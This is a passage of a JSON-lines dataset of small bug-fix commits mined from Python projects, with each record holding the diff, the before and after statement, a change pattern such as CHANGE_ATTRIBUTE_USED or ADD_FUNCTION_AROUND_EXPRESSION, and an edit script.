{"project": "gspread", "commit_sha": "858d33458872fc01c5474482a32f55aeeb58b67a", "parent_sha": "a109c77ea80342e189ad16ddaf683cf5d373274c", "file_path": "gspread/models.py", "project_url": "https://github.com/chrisburr/gspread", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -565,7 +565,7 @@ class Worksheet(object):\n                 new_val = values[ind] if ind < len(values) else ''\n             else:\n                 # For all other rows, take the cell values from the row above\n-                new_val = cells_after_insert[ind - self.col_count].value\n+                new_val = cells_after_insert[ind - self.col_count].input_value\n             cell.value = new_val\n \n         self.update_cells(cells_after_insert)\n", "before": "else : new_val = cells_after_insert [ ind - self . col_count ] . value", "after": "else : new_val = cells_after_insert [ ind - self . col_count ] . input_value", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:value\", 3, 68, 3, 73], \"input_value\"]]"}
{"project": "coursebuilder-core", "commit_sha": "10144aad0cb957a3a8f77a1b62c860eb7e81f32b", "parent_sha": "fa268857abc383fd1cb6f7a9850e2a3fe9018b0b", "file_path": "coursebuilder/controllers/sites.py", "project_url": "https://github.com/imisi-akande/coursebuilder-core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -790,7 +790,7 @@ def _add_new_course_entry_to_persistent_configuration(raw):\n         entity = ConfigPropertyEntity(key_name=GCB_COURSES_CONFIG.name)\n         entity.is_draft = False\n     if not entity.value:\n-        entity.value = GCB_COURSES_CONFIG.default_value\n+        entity.value = GCB_COURSES_CONFIG.value\n     lines = entity.value.splitlines()\n \n     # Add new entry to the rest of the entries. Since entries are matched\n", "before": "entity . value = GCB_COURSES_CONFIG . default_value", "after": "entity . value = GCB_COURSES_CONFIG . value", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:default_value\", 3, 43, 3, 56], \"value\"]]"}
{"project": "pony", "commit_sha": "6a279f692efd8459b1026382f02a9ba3c405e557", "parent_sha": "8d26833a5d9612abce991081b6e9990d60218a0b", "file_path": "pony/web.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -939,7 +939,7 @@ def xslt_set_base_url(url):\n \r\n @xslt_function\r\n def xslt_conversation():\r\n-    return local.response._new_conversation_data\r\n+    return local.response.conversation_data\r\n \r\n @xslt_function\r\n def xslt_url(url):\r\n", "before": "return local . response . _new_conversation_data", "after": "return local . response . conversation_data", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_new_conversation_data\", 3, 27, 3, 49], \"conversation_data\"]]"}
{"project": "pony", "commit_sha": "09917db5408f8e8a086be56645338df5df9ad39d", "parent_sha": "5628e692d2cae7027a5b015a088d371b20d2f0c2", "file_path": "pony/forms.py", "project_url": "https://github.com/jelmer/pony", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -390,7 +390,7 @@ class BaseWidget(HtmlField):\n         self._label = label\r\n     label = property(_get_label, _set_label)\r\n     def __unicode__(self):\r\n-        return htmljoin((self._label, self.tag, self.error))\r\n+        return htmljoin((self.label, self.tag, self.error))\r\n     html = property(__unicode__)\r\n     @property\r\n     def hidden(self):\r\n", "before": "return htmljoin ( ( self . _label , self . tag , self . error ) )", "after": "return htmljoin ( ( self . label , self . tag , self . error ) )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:_label\", 3, 31, 3, 37], \"label\"]]"}
{"project": "DQN-tensorflow", "commit_sha": "8a0b943016cdd16cc25d78c851d0ab31258bf105", "parent_sha": "8b410d70f546a12a76c813cbdf8b7d5958ce2936", "file_path": "dqn/agent.py", "project_url": "https://github.com/ArunkumarRamanan/DQN-tensorflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -146,7 +146,7 @@ class Agent(BaseModel):\n     t = time.time()\n     if self.double_q:\n       # Double Q-learning\n-      pred_action = self.q.eval({self.s_t: s_t_plus_1})\n+      pred_action = self.q_action.eval({self.s_t: s_t_plus_1})\n \n       q_t_plus_1_with_pred_action = self.target_q_with_idx.eval({\n         self.target_s_t: s_t_plus_1,\n", "before": "pred_action = self . q . eval ( { self . s_t : s_t_plus_1 } )", "after": "pred_action = self . q_action . eval ( { self . s_t : s_t_plus_1 } )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:q\", 3, 26, 3, 27], \"q_action\"]]"}
{"project": "genologics", "commit_sha": "e42ca8e77b7e529499990e10b94a6a187cc97c65", "parent_sha": "d6128fcb2c19808fbf2c1a18dd882b7432a9b130", "file_path": "scripts/epp1.py", "project_url": "https://github.com/BigelowLab/genologics", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ class QunatiT():\n                           'RNA':[0,5,10,20,40,60,80,100]}    \n         if set(['Standard volume','Assay type','Standard dilution']).issubset(self.udfs.keys()):\n             for standard in range(8):\n-                nuclear_acid_amount[standard] = np.true_divide(supp_conc_stds[self.udf['Assay type']][standard] * \n+                nuclear_acid_amount[standard] = np.true_divide(supp_conc_stds[self.udfs['Assay type']][standard] * \n                     self.udfs['Standard volume'], self.udfs['Standard dilution'])\n             return nuclear_acid_amount\n         else:\n", "before": "nuclear_acid_amount [ standard ] = np . true_divide ( supp_conc_stds [ self . udf [ 'Assay type' ] ] [ standard ] * self . udfs [ 'Standard volume' ] , self . udfs [ 'Standard dilution' ] )", "after": "nuclear_acid_amount [ standard ] = np . true_divide ( supp_conc_stds [ self . udfs [ 'Assay type' ] ] [ standard ] * self . udfs [ 'Standard volume' ] , self . udfs [ 'Standard dilution' ] )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:udf\", 3, 84, 3, 87], \"udfs\"]]"}
{"project": "kin-app-server", "commit_sha": "14bf744e6be109a98c80004ac0d6273f351b6d23", "parent_sha": "fe88bc3dff8625fa79e70ca9e5c1ffeebaff9534", "file_path": "kinappserver/utils.py", "project_url": "https://github.com/kinecosystem/kin-app-server", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ def get_global_config():\n     d['p2p_max_kin'] = config.P2P_MAX_KIN_AMOUNT\n     d['p2p_min_tasks'] = config.P2P_MIN_TASKS\n     if config.TOS_URL is not '':\n-        d['tos'] = config.URL\n+        d['tos'] = config.TOS_URL\n     return d\n \n \n", "before": "d [ 'tos' ] = config . URL", "after": "d [ 'tos' ] = config . TOS_URL", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:URL\", 3, 27, 3, 30], \"TOS_URL\"]]"}
{"project": "fabric8-analytics-common", "commit_sha": "3252b624331dc24ec69fc342a1307499c1086928", "parent_sha": "b52e6d9336dc02884f2da3905ea219f36838b143", "file_path": "integration-tests/features/steps/common.py", "project_url": "https://github.com/fabric8-analytics/fabric8-analytics-common", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ def anitya_url(context, url):\n \n @when('I access jobs API {url}')\n def jobs_api_url(context, url):\n-    context.response = requests.get(context.jobs_api + url)\n+    context.response = requests.get(context.jobs_api_url + url)\n \n \n @when('I access {url}')\n", "before": "context . response = requests . get ( context . jobs_api + url )", "after": "context . response = requests . get ( context . jobs_api_url + url )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:jobs_api\", 3, 45, 3, 53], \"jobs_api_url\"]]"}
{"project": "edx-platform", "commit_sha": "6ee3ea68ba6b6d2a1fcc044d5ee3d442b129109d", "parent_sha": "8e347f407831d65dd9d453093e172ac872995e34", "file_path": "common/test/acceptance/pages/studio/settings.py", "project_url": "https://github.com/keyurr2/edx-platform", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ class SettingsPage(CoursePage):\n     # Helpers\n     ################\n     def is_browser_on_page(self):\n-        return self.q(css='body.view-settings').present\n+        return self.q(css='body.view-settings').visible\n \n     def wait_for_require_js(self):\n", "before": "return self . q ( css = 'body.view-settings' ) . present", "after": "return self . q ( css = 'body.view-settings' ) . visible", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:present\", 3, 49, 3, 56], \"visible\"]]"}
{"project": "edx-platform", "commit_sha": "229958a0e02627b824de79c0985ed785cc014b64", "parent_sha": "f572bd9c76dc1366a7b8e6d070cc16bbe2a27f77", "file_path": "common/test/acceptance/pages/studio/settings.py", "project_url": "https://github.com/keyurr2/edx-platform", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ class SettingsPage(CoursePage):\n     # Helpers\n     ################\n     def is_browser_on_page(self):\n-        return self.q(css='body.view-settings').present\n+        return self.q(css='body.view-settings').visible\n \n     def wait_for_require_js(self):\n", "before": "return self . q ( css = 'body.view-settings' ) . present", "after": "return self . q ( css = 'body.view-settings' ) . visible", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:present\", 3, 49, 3, 56], \"visible\"]]"}
{"project": "zipline", "commit_sha": "b8b7049f39b2037981652a43ab911164acb4d009", "parent_sha": "3b769812706e525365f3c332fd69e2be79d612ed", "file_path": "zipline/finance/performance/period.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -457,7 +457,7 @@ class PerformancePeriod(object):\n                     self.ending_cash + self.ending_value)\n         account.total_positions_value = \\\n             getattr(self, 'total_positions_value', self.ending_value)\n-        account.total_positions_value = \\\n+        account.total_positions_exposure = \\\n             getattr(self, 'total_positions_exposure', self.ending_exposure)\n         account.regt_equity = \\\n             getattr(self, 'regt_equity', self.ending_cash)\n", "before": "account . total_positions_value = getattr ( self , 'total_positions_exposure' , self . ending_exposure )", "after": "account . total_positions_exposure = getattr ( self , 'total_positions_exposure' , self . ending_exposure )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:total_positions_value\", 3, 17, 3, 38], \"total_positions_exposure\"]]"}
{"project": "zipline", "commit_sha": "b26a40b2980789019571129cae7c5b27e42f7e37", "parent_sha": "f27b415c8366137250353dab62e549e45d07d14f", "file_path": "tests/pipeline/test_column.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class LatestTestCase(TestCase):\n         return DataFrame(\n             loader.values(column.dtype, self.calendar, self.sids)[slice_],\n             index=self.calendar[slice_],\n-            columns=self.sids,\n+            columns=self.assets,\n         )\n \n     def test_latest(self):\n", "before": "return DataFrame ( loader . values ( column . dtype , self . calendar , self . sids ) [ slice_ ] , index = self . calendar [ slice_ ] , columns = self . sids , )", "after": "return DataFrame ( loader . values ( column . dtype , self . calendar , self . sids ) [ slice_ ] , index = self . calendar [ slice_ ] , columns = self . assets , )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:sids\", 3, 26, 3, 30], \"assets\"]]"}
{"project": "zipline", "commit_sha": "c45b49a315a501bcac3bd9c9818cb842f4376b79", "parent_sha": "1f0e760856659a01ae74846a0cd3080185d65d4a", "file_path": "zipline/gens/transform.py", "project_url": "https://github.com/andportnoy/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -184,7 +184,7 @@ class EventWindow:\n         if self.market_aware:\n             self.drop_condition = self.out_of_market_window\n         else:\n-            self.drop_condition = self.out_of_timedelta\n+            self.drop_condition = self.out_of_delta\n \n     @abstractmethod\n     def handle_add(self, event):\n", "before": "self . drop_condition = self . out_of_timedelta", "after": "self . drop_condition = self . out_of_delta", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:out_of_timedelta\", 3, 40, 3, 56], \"out_of_delta\"]]"}
{"project": "modmail", "commit_sha": "2ea2246c7dbc684ba40761098cf5f50919366b2a", "parent_sha": "a56feec0aed160b90e8aeb90521dc696e0ad183d", "file_path": "cogs/utility.py", "project_url": "https://github.com/armani12/modmail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1075,7 +1075,7 @@ class Utility:\n                 f'to does not exist: `{level}`.'\n             )\n             return await ctx.send(embed=embed)\n-        permissions = self.bot.config.command_permissions.get(PermissionLevel[level.upper()].name)\n+        permissions = self.bot.config.level_permissions.get(PermissionLevel[level.upper()].name)\n         if permissions is None or not permissions:\n             embed = Embed(\n                 title=f'Permission entries for permission level `{level}`:',\n", "before": "permissions = self . bot . config . command_permissions . get ( PermissionLevel [ level . upper ( ) ] . name )", "after": "permissions = self . bot . config . level_permissions . get ( PermissionLevel [ level . upper ( ) ] . name )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:command_permissions\", 3, 39, 3, 58], \"level_permissions\"]]"}
{"project": "DataProcessingForMaserObservation", "commit_sha": "b195449e00750b43f9fa3935a0bc91d3956e0622", "parent_sha": "c878465e8e85ee00a8eeee2f695dec35acba62f8", "file_path": "total_spectrum_analyzer_qt5.py", "project_url": "https://github.com/sklandrausis/DataProcessingForMaserObservation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -458,7 +458,7 @@ class Analyzer(QWidget):\n         self.plot_1 = Plot()\n         self.plot_1.creatPlot(self.grid, 'Velocity (km sec$^{-1}$)',\n                               'Flux density (Jy)', \"Left Polarization\", (1, 0), \"linear\")\n-        self.plot_1.plot(self.xdata, self.ydata_right, 'ko', label='Data Points', markersize=1, picker=5)\n+        self.plot_1.plot(self.xdata, self.ydata_left, 'ko', label='Data Points', markersize=1, picker=5)\n \n         self.plot_2 = Plot()\n         self.plot_2.creatPlot(self.grid, 'Velocity (km sec$^{-1}$)',\n", "before": "self . plot_1 . plot ( self . xdata , self . ydata_right , 'ko' , label = 'Data Points' , markersize = 1 , picker = 5 )", "after": "self . plot_1 . plot ( self . xdata , self . ydata_left , 'ko' , label = 'Data Points' , markersize = 1 , picker = 5 )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:ydata_right\", 3, 43, 3, 54], \"ydata_left\"]]"}
{"project": "populo", "commit_sha": "e6db6e9ea3acb798638368aa78397c75e54c56e8", "parent_sha": "eb5a90a3ed2203cdf8d08616a4e3f51f4b5548c5", "file_path": "common/lib/xmodule/xmodule/crowdsource_hinter.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -246,7 +246,7 @@ class CrowdsourceHinterModule(CrowdsourceHinterFields, XModule):\n         # The student got it right.\n         # Did he submit at least one wrong answer?\n-        if len(self.previous_answers) == 0:\n+        if len(self.user_submissions) == 0:\n             # No.  Nothing to do here.\n             return\n         # Make a hint-voting interface for each wrong answer.  The student will only\n", "before": "if len ( self . previous_answers ) == 0 : return", "after": "if len ( self . user_submissions ) == 0 : return", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:previous_answers\", 2, 21, 2, 37], \"user_submissions\"]]"}
{"project": "populo", "commit_sha": "7bb6d6f2812429af98eb0246caf6513f0db447a6", "parent_sha": "eb11ba76a7ed5c31e4f466965201904121f7cfa9", "file_path": "common/djangoapps/course_groups/cohorts.py", "project_url": "https://github.com/chauhanhardik/populo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -246,7 +246,7 @@ def add_user_to_cohort(cohort, username_or_email):\n     previous_cohort = None\n \n     course_cohorts = CourseUserGroup.objects.filter(\n-        course_id=cohort.course_key,\n+        course_id=cohort.course_id,\n         users__id=user.id,\n         group_type=CourseUserGroup.COHORT\n     )\n", "before": "course_cohorts = CourseUserGroup . objects . filter ( course_id = cohort . course_key , users__id = user . id , group_type = CourseUserGroup . COHORT )", "after": "course_cohorts = CourseUserGroup . objects . filter ( course_id = cohort . course_id , users__id = user . id , group_type = CourseUserGroup . COHORT )", "sstub_pattern": "CHANGE_ATTRIBUTE_USED", "edit_script": "[[\"Update\", [\"identifier:course_key\", 3, 26, 3, 36], \"course_id\"]]"}
{"project": "gyp", "commit_sha": "0ef41e45404ced03099f4b218122eb45fa242b66", "parent_sha": "b8ef53d4a840dbcbdea307119e2fb256010e6b9f", "file_path": "pylib/gyp/msvs_emulation.py", "project_url": "https://github.com/chromium/gyp", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ def EncodeRspFileList(args):\n   # to get quotes around the remainder (after 'call') since other generators\n   # and gyp in general don't really support spaces in paths.\n   if not args: return ''\n-  program = args[0]\n+  program = os.path.normpath(args[0])\n   return program + ' ' + ' '.join(QuoteForRspFile(arg) for arg in args[1:])\n \n \n", "before": "program = args [ 0 ]", "after": "program = os . path . normpath ( args [ 0 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 3, 3, 20], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:normpath\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"subscript\", 3, 13, 3, 20], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:path\", \"T\"], 2]]"}
{"project": "spotify-skill", "commit_sha": "f5b2801fb79546426174650fb14d4753930cc4ee", "parent_sha": "31ac11e92583592eb45fbdf2d4e26c7b781441b2", "file_path": "__init__.py", "project_url": "https://github.com/forslund/spotify-skill", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -445,7 +445,7 @@ class SpotifySkill(MycroftSkill):\n         if devices and len(devices) > 0:\n             # Otherwise get a device with the selected name\n             devices_by_name = {d['name']: d for d in devices}\n-            key, confidence = match_one(name, devices_by_name.keys())\n+            key, confidence = match_one(name, list(devices_by_name.keys()))\n             if confidence > 0.5:\n                 return devices_by_name[key]\n         return None\n", "before": "key , confidence = match_one ( name , devices_by_name . keys ( ) )", "after": "key , confidence = match_one ( name , list ( devices_by_name . keys ( ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 47, 3, 69], [\"identifier:list\", \"T\"], 0], [\"Insert\", [\"call\", 3, 47, 3, 69], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 47, 3, 69], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "vermouth-martinize", "commit_sha": "91ec8c62899cd6cc6b182b0f3f6ace9022adc09c", "parent_sha": "e7c1ec2f66ecf60703bb979171507eac2c3aa82d", "file_path": "vermouth/pdb/pdb.py", "project_url": "https://github.com/marrink-lab/vermouth-martinize", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -251,7 +251,7 @@ def read_pdb(file_name, exclude=('SOL',), ignh=False, model=0):\n             slices.append(slice(start, start + width))\n         start = start + abs(width)\n \n-    with open(file_name) as pdb:\n+    with open(str(file_name)) as pdb:\n         for line in pdb:\n             record = line[:6]\n             if record == 'ENDMDL':\n", "before": "with open ( file_name ) as pdb : for line in pdb : record = line [ : 6 ] if record == 'ENDMDL' : ", "after": "with open ( str ( file_name ) ) as pdb : for line in pdb : record = line [ : 6 ] if record == 'ENDMDL' : ", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 14, 3, 25], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 14, 3, 25], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 14, 3, 25], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 14, 3, 25], 1]]"}
{"project": "knowledge-repo", "commit_sha": "ebfa83fcb2512149332a7efee7db9833dda865be", "parent_sha": "1c8c5ad11a8a3aee76ca54fb54f352765eaea9b6", "file_path": "knowledge_repo/app/routes/web_editor.py", "project_url": "https://github.com/RasaHQ/knowledge-repo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -274,7 +274,7 @@ def save_post():\n     headers['created_at'] = datetime.strptime(data['created_at'], '%Y-%m-%d')\n     headers['updated_at'] = datetime.strptime(data['updated_at'], '%Y-%m-%d')\n     headers['title'] = str(data['title'])\n-    headers['path'] = post.path\n+    headers['path'] = str(post.path)\n     headers['project'] = str(data['project'])\n     # TODO: thumbnail header not working currently, as feed image set with kp\n     # method not based on header\n", "before": "headers [ 'path' ] = post . path", "after": "headers [ 'path' ] = str ( post . path )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 5, 3, 32], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 23, 3, 32], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "git-changelog", "commit_sha": "6d089785f692d4a21349c9eaa117641a481ba398", "parent_sha": "dc515898fef7dd47cde749c7dd690f607f5cf10c", "file_path": "src/git_changelog/build.py", "project_url": "https://github.com/pawamoy/git-changelog", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -118,7 +118,7 @@ class Version:\n \n     @property\n     def is_minor(self):\n-        return self.tag.split(\".\", 2)[2]\n+        return bool(self.tag.split(\".\", 2)[2])\n \n \n class Changelog:\n", "before": "return self . tag . split ( \".\" , 2 ) [ 2 ]", "after": "return bool ( self . tag . split ( \".\" , 2 ) [ 2 ] )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"return_statement\", 3, 9, 3, 41], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:bool\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 16, 3, 41], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "mouse_connectivity_models", "commit_sha": "fd16420a9ad12c2aad5639e22aa88af03c365513", "parent_sha": "f487e45fe5961e00c44b37bd6d2ea99fd89bf74f", "file_path": "mcmodels/core/base.py", "project_url": "https://github.com/AllenInstitute/mouse_connectivity_models", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -524,7 +524,7 @@ class RegionalData(_BaseData):\n \n         # fill empty injection structures\n         missing = set(self.injection_structure_ids) - set(injections.columns.values)\n-        injections[missing] = 0.\n+        injections[list(missing)] = 0.\n \n         # subset to structure ids\n         injections = injections[self.injection_structure_ids]\n", "before": "injections [ missing ] = 0.", "after": "injections [ list ( missing ) ] = 0.", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"subscript\", 3, 9, 3, 28], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:list\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:missing\", 3, 20, 3, 27], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "iota-swarm-node", "commit_sha": "a2d12fc340818f51d9badbbbda7ee999fc31c6cc", "parent_sha": "30fd38894eac294384bcf897c35256d7d88b2f27", "file_path": "extensions/tangleid/main.py", "project_url": "https://github.com/yillkid/iota-swarm-node", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def list_all_claims(data):\n     for obj in list_claims:\n         list_output.append(str(obj))\n \n-    return str(list_output)\n+    return str(json.dumps(list_output))\n \n def get_claim_info(data):\n     data = json.loads(data)\n", "before": "return str ( list_output )", "after": "return str ( json . dumps ( list_output ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 15, 3, 28], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 15, 3, 28], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 15, 3, 28], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 15, 3, 28], 1], [\"Insert\", \"N1\", [\"identifier:json\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:dumps\", \"T\"], 2]]"}
{"project": "sqlmap", "commit_sha": "24e67289c89382cec78dd938dedd527d8c646e3c", "parent_sha": "cda27ec20beefe858012575a65cee6007f8019a1", "file_path": "plugins/dbms/mssqlserver/enumeration.py", "project_url": "https://github.com/reposities/sqlmap", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -311,7 +311,7 @@ class Enumeration(GenericEnumeration):\n             colQuery = \"%s%s\" % (colCond, colCondParam)\n             colQuery = colQuery % unsafeSQLIdentificatorNaming(column)\n \n-            for db in dbs.keys():\n+            for db in filter(None, dbs.keys()):\n                 db = safeSQLIdentificatorNaming(db)\n \n                 if conf.excludeSysDbs and db in self.excludeDbsList:\n", "before": "for db in dbs . keys ( ) : db = safeSQLIdentificatorNaming ( db ) if conf . excludeSysDbs and db in self . excludeDbsList : ", "after": "for db in filter ( None , dbs . keys ( ) ) : db = safeSQLIdentificatorNaming ( db ) if conf . excludeSysDbs and db in self . excludeDbsList : ", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 23, 3, 33], [\"identifier:filter\", \"T\"], 0], [\"Insert\", [\"call\", 3, 23, 3, 33], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"none:None\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Move\", \"N0\", [\"call\", 3, 23, 3, 33], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "erpnext-v7", "commit_sha": "dcb41da02a27fc73de7722f557ea22bb05cd8526", "parent_sha": "530b86b9b2041a485d6927b396c249ff2f81acdf", "file_path": "erpnext/accounts/doctype/account/account.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ class Account(Document):\n \t\tif not cint(frappe.defaults.get_global_default(\"auto_accounting_for_stock\")):\n \t\t\treturn\n \t\t\t\n-\t\tif self.account_type == \"Stock\" and not self.is_group:\n+\t\tif self.account_type == \"Stock\" and not cint(self.is_group):\n \t\t\tif not self.warehouse:\n \t\t\t\tthrow(_(\"Warehouse is mandatory\"))\n \t\t\t\t\n", "before": "if self . account_type == \"Stock\" and not self . is_group : if not self . warehouse : throw ( _ ( \"Warehouse is mandatory\" ) )", "after": "if self . account_type == \"Stock\" and not cint ( self . is_group ) : if not self . warehouse : throw ( _ ( \"Warehouse is mandatory\" ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 39, 3, 56], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:cint\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 43, 3, 56], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "erpnext-v7", "commit_sha": "4b08f9ad1f636ef4497b87fd94bed657403fcc7d", "parent_sha": "c9501eb4601197365e1555a97bfda82f482fc133", "file_path": "erpnext/patches/v7_0/migrate_schools_to_erpnext.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,4 +22,4 @@ def execute():\n \n def reload_doctypes_for_schools_icons():\n \tfor d in frappe.get_all('DocType', filters={'module': 'Schools'}):\n-\t\tfrappe.reload_doc('schools', 'doctype', d.name)\n+\t\tfrappe.reload_doc('schools', 'doctype', frappe.scrub(d.name))\n", "before": "frappe . reload_doc ( 'schools' , 'doctype' , d . name )", "after": "frappe . reload_doc ( 'schools' , 'doctype' , frappe . scrub ( d . name ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 20, 3, 50], [\"call\", \"N0\"], 5], [\"Insert\", [\"argument_list\", 3, 20, 3, 50], [\"):)\", \"T\"], 6], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"identifier:frappe\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:scrub\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", 